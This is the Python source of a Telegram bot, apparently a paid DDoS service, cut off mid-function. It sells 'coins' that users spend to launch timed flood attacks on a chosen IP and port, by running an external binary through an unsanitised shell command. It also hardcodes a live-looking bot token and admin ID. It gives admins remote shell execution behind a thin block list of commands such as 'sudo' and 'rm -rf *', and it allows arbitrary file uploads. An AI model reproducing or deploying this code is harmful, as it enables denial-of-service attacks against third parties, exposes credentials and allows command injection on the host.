# ===========================================================
#                  PARVEEN'S BOT SCRIPT
# ===========================================================

# --------------------[ IMPORTS ]----------------------------

import os
import time
import json
import telebot
import datetime
import threading
import subprocess
from telebot import types

# --------------------[ CONFIGURATION ]----------------------



# Insert your Telegram bot token here
bot = telebot.TeleBot('7200492297:AAHzBXY_bsv8YDXjywdK-g8BD-bp0zZ5sXA')

# Insert your admin id here
admin_id = ["1760458600"]

# Files for data storage
LOG_FILE = "log.txt"
DATA_FILE = "data.json"

# Attack setting for users
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}



# --------------------[ IN-MEMORY STORAGE ]----------------------

users = {}
user_coins = {}
user_cooldowns = {}
user_last_attack = {}

# --------------------[ STORAGE ]----------------------



# Load data from data.json if it exists
def load_data():
    global user_coins
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as file:
            data = json.load(file)
            user_coins = data.get("coins", {})

# Save data to data.json
def save_data():
    data = {
        "coins": user_coins
    }
    with open(DATA_FILE, "w") as file:
        json.dump(data, file, indent=4)

def load_config():
    config_file = "config.json"

    if not os.path.exists(config_file):
        print(f"Config file {config_file} does not exist. Please create it.")
        exit(1)

    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON in {config_file}: {str(e)}")
        exit(1)

config = load_config()

# Extract values from config.json
full_command_type = config["initial_parameters"]
threads = config.get("initial_threads")
packets = config.get("initial_packets")
binary = config.get("initial_binary")
MAX_ATTACK_TIME = config.get("max_attack_time")
ATTACK_COOLDOWN = config.get("attack_cooldown")
ATTACK_COST = config.get("cost_per_attack")

def save_config():
    config = {
        "initial_parameters": full_command_type,
        "initial_threads": threads,
        "initial_packets": packets,
        "initial_binary": binary,
        "max_attack_time": MAX_ATTACK_TIME,
        "attack_cooldown": ATTACK_COOLDOWN,
        "cost_per_attack": ATTACK_COST
    }

    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

# Log command function
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"{user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ KEYBOARD BUTTONS ]----------------------


@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")    
    coin_button = types.KeyboardButton("💰 Buy Coins")
    
    # Show the "⚙️ Settings" and "⏺️ Terminal" buttons only to admins
    if str(message.chat.id) in admin_id:
        settings_button = types.KeyboardButton("⚙️ Settings")
        terminal_button = types.KeyboardButton("⏺️ Terminal")
        markup.add(attack_button, myinfo_button, coin_button, settings_button, terminal_button)
    else:
        markup.add(attack_button, myinfo_button, coin_button)
    
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 Parveen's 𝗯𝗼𝘁!", reply_markup=markup)
    
@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
def settings_command(message):
    """Admin-only settings menu."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        threads_button = types.KeyboardButton("Threads")
        binary_button = types.KeyboardButton("Binary")
        packets_button = types.KeyboardButton("Packets")
        command_button = types.KeyboardButton("parameters")
        attack_cooldown_button = types.KeyboardButton("Attack Cooldown")
        attack_time_button = types.KeyboardButton("Attack Time")
        attack_cost_button = types.KeyboardButton("Attack cost")
        back_button = types.KeyboardButton("<< Back to Menu")

        markup.add(threads_button, binary_button, packets_button, command_button, attack_cooldown_button, attack_time_button, attack_cost_button, back_button)
        bot.reply_to(message, "⚙️ 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗠𝗲𝗻𝘂", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "⏺️ Terminal")
def terminal_menu(message):
    """Show the terminal menu for admins."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        command_button = types.KeyboardButton("Command")
        upload_button = types.KeyboardButton("Upload")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(command_button, upload_button, back_button)
        bot.reply_to(message, "⚙️ 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝗹 𝗠𝗲𝗻𝘂", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

@bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
def back_to_main_menu(message):
    """Go back to the main menu."""
    start_command(message)

# ------------------------------------------------------------
    
    
    
    
# --------------------[ ATTACK SECTION ]----------------------
    
    
attack_in_process = False

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    global attack_in_process  # Access the global variable
    user_id = str(message.chat.id)
    
    # Check if the user has enough coins for the attack
    if user_id not in user_coins or user_coins[user_id] < ATTACK_COST:
        response = f"⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! ⛔️\n\nOops! It seems like you don't have enough coins to use the Attack command. To gain coins and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for coins.\n🌟 Become a proud supporter and purchase coins.\n💬 Chat with an admin now and level up your experience!\n\nPer attack it cost only {ATTACK_COST} coins!"
        bot.reply_to(message, response)
        return
    
    if attack_in_process:
        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
        return

    # Prompt the user for attack details
    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_details)

# Global variable to track attack status and start time
attack_in_process = False
attack_start_time = None
attack_duration = 0  # Attack duration in seconds

# Function to handle the attack command
@bot.message_handler(commands=['check'])
def show_remaining_attack_time(message):
    if attack_in_process:
        # Calculate the elapsed time
        elapsed_time = (datetime.datetime.now() - attack_start_time).total_seconds()
        remaining_time = max(0, attack_duration - elapsed_time)  # Ensure remaining time doesn't go negative

        if remaining_time > 0:
            response = f"🚨 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀! 🚨\n\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲: {int(remaining_time)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
        else:
            response = "✅ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!"
    else:
        response = "✅ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀"

    bot.reply_to(message, response)

def run_attack(command):
    subprocess.Popen(command, shell=True)

attack_message = None

def process_attack_details(message):
    global attack_in_process, attack_start_time, attack_duration, attack_message
    attack_message = message  # Save the message object for later use
    user_id = str(message.chat.id)
    details = message.text.split()
    
    if len(details) != 3:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️\n")
        return
    
    if user_id in user_last_attack:
        time_since_last_attack = (datetime.datetime.now() - user_last_attack[user_id]).total_seconds()
        if time_since_last_attack < ATTACK_COOLDOWN:
            remaining_cooldown = int(ATTACK_COOLDOWN - time_since_last_attack)
            bot.reply_to(message, f"⛔ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {remaining_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗮𝗴𝗮𝗶𝗻.")
            return
    
    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])

            # Check if the target IP starts with an allowed prefix
            if not target.startswith(ALLOWED_IP_PREFIXES):
                bot.reply_to(message, "⛔️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")
                return  # Stop further execution

            # Check if the port is within the allowed range
            if port not in ALLOWED_PORT_RANGE:
                bot.reply_to(message, f"⛔️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗮𝗿𝗲 𝗼𝗻𝗹𝘆 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁𝘀 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 [10003 - 29999]")
                return  # Stop further execution

            # Check if the port is in the blocked list
            if port in BLOCKED_PORTS:
                bot.reply_to(message, f"⛔️ 𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗮𝗻𝗱 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝘂𝘀𝗲𝗱!")
                return  # Stop further execution

            # **Check if attack time exceeds MAX_ATTACK_TIME**
            if time > MAX_ATTACK_TIME:
                bot.reply_to(message, f"⛔️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 {MAX_ATTACK_TIME} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀!")
                return  # Stop further execution
  
            else:
                user_coins[user_id] -= ATTACK_COST
                remaining_coins = user_coins[user_id]  # Now the value is correct
                save_data()
                log_command(user_id, target, port, time)
                # Modify full command type logic
                if full_command_type == 1:
                    full_command = f"./{binary} {target} {port} {time}"
                elif full_command_type == 2:
                    full_command = f"./{binary} {target} {port} {time} {threads}"
                elif full_command_type == 3:
                    full_command = f"./{binary} {target} {port} {time} {packets} {threads}"

                username = message.chat.username or "No username"

                # Set attack_in_process to True before sending the response
                attack_in_process = True
                attack_start_time = datetime.datetime.now()
                attack_duration = time  
                user_last_attack[user_id] = datetime.datetime.now()
            
                # Send response
                response = (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
                        f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
                        f"𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                        f"𝗗𝗲𝗱𝘂𝗰𝘁𝗲𝗱: {ATTACK_COST} 𝗰𝗼𝗶𝗻𝘀\n"
                        f"𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗼𝗶𝗻𝘀: {remaining_coins}\n"
                        f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}")
                        
                bot.reply_to(message, response)

                # Run attack in a separate thread
                attack_thread = threading.Thread(target=run_attack, args=(full_command,))
                attack_thread.start()

                # Reset attack_in_process after the attack ends
                threading.Timer(time, reset_attack_status).start()

        except ValueError:
                bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️")

def reset_attack_status():
    global attack_in_process
    attack_in_process = False

    # Send the attack finished message after the attack duration is complete
    bot.send_message(attack_message.chat.id, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")
    
# ---------------------------------------------------------------------
#   
#
#
#
# --------------------[ USERS AND COINS SECTOIN ]----------------------

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Admin" if user_id in admin_id else "User"
    status = "Active ✅" if user_id in user_coins else "Inactive ❌"

    # Format the response
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🔖 𝗥𝗼𝗹𝗲: {role}\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
        f"💰 𝗖𝗼𝗶𝗻𝘀: {user_coins.get(user_id, 0)}"
    )

    bot.reply_to(message, response)
	
@bot.message_handler(commands=['users'])
def show_users(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        if user_coins:  # Check if there are users
            users_info = "\n".join([f"🆔 {uid}: {coins} coins" for uid, coins in user_coins.items()])
            response = f"𝗨𝘀𝗲𝗿𝘀 𝗮𝗻𝗱 𝗖𝗼𝗶𝗻𝘀:\n\n{users_info}"
        else:
            response = "No users found."
        bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        
# Admin adds coins to a user's account
@bot.message_handler(commands=['add'])
def add_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
            if target_user_id not in user_coins:
                user_coins[target_user_id] = 0
            user_coins[target_user_id] += coins
            save_data()  # Save updated data to JSON

            # Send message to admin
            response = f"✅ {coins} 𝗰𝗼𝗶𝗻𝘀 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 {target_user_id}'𝘀 𝗮𝗰𝗰𝗼𝘂𝗻𝘁!"
            
        except (IndexError, ValueError):
            response = "❗️𝗨𝘀𝗮𝗴𝗲: /add <user_id> <coins>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['remove'])
def clear_user(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            target_user_id = message.text.split()[1]
            
            if target_user_id in user_coins:
                del user_coins[target_user_id]
                save_data()  # Save updated data to JSON
                response = f"✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗱𝗮𝘁𝗮"
            else:
                response = f"❗ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺."
        except IndexError:
            response = "❗ Usage: /remove <user_id>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    
    bot.reply_to(message, response)

# Admin deducts coins from a user's account
@bot.message_handler(commands=['deduct'])
def deduct_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
            if target_user_id not in user_coins:
                response = f"❗️𝗨𝘀𝗲𝗿 {target_user_id} 𝗱𝗼𝗲𝘀𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗰𝗼𝗶𝗻𝘀 𝘆𝗲𝘁"
            else:
                # Deduct the coins
                user_coins[target_user_id] = max(0, user_coins[target_user_id] - coins)
                save_data()  # Save updated data to JSON
                
                # Send message to admin
                response = f"✅ {coins} 𝗰𝗼𝗶𝗻𝘀 𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 {target_user_id}'𝘀 𝗮𝗰𝗰𝗼𝘂𝗻𝘁!"

        except (IndexError, ValueError):
            response = "❗️𝗨𝘀𝗮𝗴𝗲: /deduct <user_id> <coins>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    
    bot.reply_to(message, response)
    
@bot.message_handler(func=lambda message: message.text == "💰 Buy Coins")
def buy_coins(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("50 COINS - 75/-", callback_data="buy_50")
    button2 = types.InlineKeyboardButton("100 COINS - 150/-", callback_data="buy_100")
    button3 = types.InlineKeyboardButton("200 COINS - 300/-", callback_data="buy_200")
    markup.add(button1, button2, button3)
    
    bot.reply_to(message, "✅ 𝗖𝗵𝗼𝗼𝘀𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def handle_buy_callback(call):
    admin_username = "@Parveen_solanki"  # Replace with your admin username
    coin_plans = {
        "buy_50": "50 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 75 Rs",
        "buy_100": "100 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 150 Rs",
        "buy_200": "200 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 300 Rs"
    }

    if call.data in coin_plans:
        chosen_plan = coin_plans[call.data]
        bot.send_message(call.message.chat.id, f"📩 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗯𝘂𝘆 𝗰𝗼𝗶𝗻𝘀:\n\n👤 𝗔𝗱𝗺𝗶𝗻: {admin_username}\n💳 𝗣𝗹𝗮𝗻: {chosen_plan}")
        bot.delete_message(call.message.chat.id, call.message.message_id)  # Delete the plan selection message
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        
@bot.message_handler(commands=['status'])
def status_command(message):
    """Show current status for threads, binary, packets, and command type."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Prepare the status message
        status_message = (
            f"☣️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 ☣️\n\n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝘀𝘁: {ATTACK_COST}\n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {ATTACK_COOLDOWN}\n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲: {MAX_ATTACK_TIME}\n\n"
            f"-----------------------------------\n"
            f"✴️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ✴️\n\n"
            f"▶️ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲: {binary}\n"
            f"▶️ 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀: {full_command_type}\n"
            f"▶️ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}\n"
            f"▶️ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀: {packets}\n"
        )
        bot.reply_to(message, status_message)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ TERMINAL SECTION ]----------------------

# List of blocked command prefixes
blocked_prefixes = ["nano", "sudo", "rm *", "rm -rf *"]

@bot.message_handler(func=lambda message: message.text == "Command")
def command_to_terminal(message):
    """Handle sending commands to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱:")
        bot.register_next_step_handler(message, execute_terminal_command)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def execute_terminal_command(message):
    """Execute the terminal command entered by the admin."""
    try:
        command = message.text.strip()
        
        # Check if the command starts with any of the blocked prefixes
        if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
            bot.reply_to(message, "❗️𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱.")
            return
        
        # Execute the command if it's not blocked
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            bot.reply_to(message, f"⏺️ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗢𝘂𝘁𝗽𝘂𝘁:\n`{output}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "✅ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗲𝘅𝗲𝗰𝘂𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘂𝗹𝗹𝘆")
    except Exception as e:
        bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱: {str(e)}")

@bot.message_handler(func=lambda message: message.text == "Upload")
def upload_to_terminal(message):
    """Handle file upload to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "📤 𝗦𝗲𝗻𝗱 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱 𝗶𝗻 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹.")
        bot.register_next_step_handler(message, process_file_upload)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_file_upload(message):
    """Process the uploaded file and save it in the current directory."""
    if message.document:
        try:
            # Get file info and download it
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Get the current directory of the Python script
            current_dir = os.path.dirname(os.path.abspath(__file__))
            
            # Create the full file path where the file will be saved
            file_path = os.path.join(current_dir, message.document.file_name)
            
            # Save the file in the current directory
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            bot.reply_to(message, f"📤 𝗙𝗶𝗹𝗲 𝘂𝗽𝗹𝗼𝗮𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆:\n `{file_path}`", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, f"❗️𝗘𝗿𝗿𝗼𝗿 𝘂𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲: {str(e)}")
    else:
        bot.reply_to(message, "❗️𝗦𝗲𝗻𝗱 𝗼𝗻𝗹𝘆 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱 ")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ ATTACK SETTINGS ]----------------------

@bot.message_handler(func=lambda message: message.text == "Threads")
def set_threads(message):
    """Admin command to change threads."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝘁𝗵𝗿𝗲𝗮𝗱𝘀:")
        bot.register_next_step_handler(message, process_new_threads)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_threads(message):
        new_threads = message.text.strip()
        global threads
        threads = new_threads
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_threads}")

@bot.message_handler(func=lambda message: message.text == "Binary")
def set_binary(message):
    """Admin command to change the binary name."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗮𝗺𝗲 𝗼𝗳 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗯𝗶𝗻𝗮𝗿𝘆:")
        bot.register_next_step_handler(message, process_new_binary)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_binary(message):
    new_binary = message.text.strip()
    global binary
    binary = new_binary
    save_config()  # Save changes
    bot.reply_to(message, f"✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: `{new_binary}`", parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "Packets")
def set_packets(message):
    """Admin command to change packets."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝗽𝗮𝗰𝗸𝗲𝘁𝘀:")
        bot.register_next_step_handler(message, process_new_packets)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_packets(message):
    new_packets = message.text.strip()
    global packets
    packets = new_packets
    save_config()  # Save changes
    bot.reply_to(message, f"✅ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_packets}")

@bot.message_handler(func=lambda message: message.text == "parameters")
def set_command_type(message):
    """Admin command to change the full_command_type using inline buttons."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("parameters 1", callback_data="arg_1")
        btn2 = types.InlineKeyboardButton("parameters 2", callback_data="arg_2")
        btn3 = types.InlineKeyboardButton("parameters 3", callback_data="arg_3")
        markup.add(btn1, btn2, btn3)
        
        bot.reply_to(message, "🔹 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 𝘁𝘆𝗽𝗲:", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("arg_"))
def process_parameters_selection(call):
    """Handles parameters selection via inline buttons."""
    global full_command_type
    selected_arg = int(call.data.split("_")[1])  # Extract parameters number

    # Update the global command type
    full_command_type = selected_arg
    save_config()  # Save the new configuration

    # Generate response message based on the selected parameters
